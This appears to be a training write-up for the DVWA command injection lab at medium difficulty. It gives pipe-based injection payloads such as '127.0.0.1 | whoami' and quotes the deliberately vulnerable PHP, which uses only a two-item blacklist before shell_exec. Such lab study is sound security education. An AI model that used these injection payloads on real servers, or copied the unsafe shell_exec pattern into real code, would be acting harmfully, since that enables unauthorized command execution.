# Command Injection - Medium

## Attack Steps

1. **Open the DVWA Command Injection page**  
   Navigate to:
http://localhost/dvwa/vulnerabilities/exec
 
2. **Enter the payload** in the input field:  
```bash
8.8.8.8 | dir
```

3. Click the **Submit** button.

4. Observe the output You should see the ping results followed by the directory listing from the DVWA server, for example:

    ```bash 
    Volume in drive C has no label.
    Volume Serial Number is XXXX-XXXX

    Directory of C:\xampp\htdocs\DVWA\vulnerabilities\exec

    01/01/2025  10:00 AM    <DIR>          .
    01/01/2025  10:00 AM    <DIR>          ..
               0 File(s)              0 bytes
    ```

## Vulnerable Code Analysis

### File:
`C:\xampp\htdocs\DVWA\vulnerabilities\exec\source\medium.php`

#### Key Vulnerability Points:

```php
<?php

if( isset( $_POST[ 'Submit' ]  ) ) {
	// Get input
	$target = $_REQUEST[ 'ip' ];

	// Set blacklist
	$substitutions = array(
		'&&' => '',
		';'  => '',
	);

	// Remove any of the characters in the array (blacklist).
	$target = str_replace( array_keys( $substitutions ), $substitutions, $target );

	// Determine OS and execute the ping command.
	if( stristr( php_uname( 's' ), 'Windows NT' ) ) {
		// Windows
		$cmd = shell_exec( 'ping  ' . $target );
	}
	else {
		// *nix
		$cmd = shell_exec( 'ping  -c 4 ' . $target );
	}

	// Feedback for the end user
	$html .= "<pre>{$cmd}</pre>";
}

?>
```

### Explanation
- The script processes user-submitted input (ip) and executes a system ping command:
- Only `&&` and `;` are blacklisted prevent command concatenation
- This can be exploited using a payload such as:  
    ```
    127.0.0.1 | whoami
    ```  
    - The command executed by the server becomes:  
      ```
      ping -c 3 127.0.0.1 | whoami
      ```  
    - Ping will still be run but only the output of the `whoami` command will be printed
- Causes:  
    - There was only basic blacklisting of 2 operators 
    - Still allows direct insertion of user input into a shell command, so payloads utilising piping can be injected
    - Not using safe functions like `escapeshellarg()` means special characters are interpreted by the shell.  
